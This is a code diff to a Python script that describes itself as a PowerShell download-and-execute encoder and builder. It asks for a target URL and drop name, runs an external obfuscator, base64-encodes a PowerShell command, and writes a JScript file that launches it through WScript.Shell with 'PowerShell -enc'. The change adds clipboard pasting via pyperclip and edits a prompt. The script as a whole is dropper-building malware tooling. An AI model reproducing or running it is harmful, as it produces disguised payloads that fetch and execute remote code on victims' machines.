@@ -1,5 +1,6 @@
 import base64
 import os
+import pyperclip
 
 print('## powershell download & execute , Encoder + Builder        ##')
 print('## Note: This is not a normal base64 encoder!               ##')
@@ -10,7 +11,8 @@ print('')
 target = raw_input('ENTER TARGET URL: ')
 dropname = raw_input('ENTER DROP NAME: ')
 os.system("obfuscator.exe " + target + " " + dropname)
-code = raw_input('INVOKEN STRING TO ENCODE (Control + V): ')
+clip = pyperclip.paste()
+code = raw_input('INVOKEN STRING TO ENCODE: ' + clip)
 print('')
 shellcode = base64.b64encode(code.encode('UTF-16-LE'))
 print (shellcode)
@@ -21,4 +23,4 @@ file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('PowerShell -enc " + 
 file.close()
 print('[+] Build Saved.')
 print('')
-raw_input('PRESS ANY KEY TO CONTINIUE')
+raw_input('PRESS ENTER KEY TO CONTINIUE')
